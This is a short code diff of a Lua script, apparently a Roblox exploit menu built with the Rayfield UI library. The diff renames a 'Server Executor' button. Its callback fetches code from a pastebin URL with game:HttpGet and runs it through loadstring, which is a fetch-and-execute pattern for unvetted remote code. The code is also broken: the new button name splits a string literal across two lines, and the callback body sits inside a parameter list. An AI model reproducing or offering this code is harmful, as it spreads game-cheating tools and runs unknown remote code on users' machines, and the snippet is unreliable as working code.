@@ -39,7 +39,8 @@ local Window = Rayfield:CreateWindow({
 local Section = Tab:CreateSection("Server Executor and more")
 
 local Button = Tab:CreateButton({
-   Name = "Server Exeutor",
+   Name = "ServerSide
+Exeutor",
    Callback = function(loadstring(game:HttpGet("https://pastebin.com/raw/PXAdj6ED"))();)
    -- The function that takes place when the button is pressed
    end,
